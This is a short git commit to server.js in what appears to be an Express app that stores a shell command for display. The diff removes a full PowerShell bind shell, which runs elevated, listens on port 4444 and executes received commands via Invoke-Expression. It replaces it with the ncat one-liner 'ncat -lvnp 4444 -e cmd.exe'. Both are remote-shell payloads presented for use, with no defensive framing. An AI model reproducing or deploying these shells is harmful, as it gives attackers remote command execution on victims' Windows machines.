f614a7d8c68481f742fe79e14475735cf1fb5857
Oresh25 <110625504+Oresh25@users.noreply.github.com>
2026-03-09 12:29:36 +0200

    Update server.js

--- server.js
+++ server.js
@@ -28,34 +28,7 @@ let uploadedFile = null;
 
 app.use('/files', express.static(uploadDir));
 
-const psCommand = `Start-Process powershell -Verb runAs
-
-$listener = [System.Net.Sockets.TcpListener]4444
-$listener.Start()
-Write-Host "Waiting for connection on port 4444..."
-
-$client = $listener.AcceptTcpClient()
-$stream = $client.GetStream()
-
-$writer = New-Object System.IO.StreamWriter($stream)
-$writer.AutoFlush = $true
-$reader = New-Object System.IO.StreamReader($stream)
-
-while($client.Connected) {
-    $command = $reader.ReadLine()
-
-    if($command) {
-        Write-Host "Executing: $command"
-        try {
-            $result = Invoke-Expression $command 2>&1 | Out-String
-            if ([string]::IsNullOrWhiteSpace($result)) { $result = "Command executed (No output)" }
-            $writer.WriteLine($result)
-        } catch {
-            $writer.WriteLine("Error: $($_.Exception.Message)")
-        }
-        $writer.WriteLine("---END_OF_OUTPUT---")
-    }
-}`;
+const psCommand = `ncat -lvnp 4444 -e cmd.exe`;
 
 function renderPage() {
 
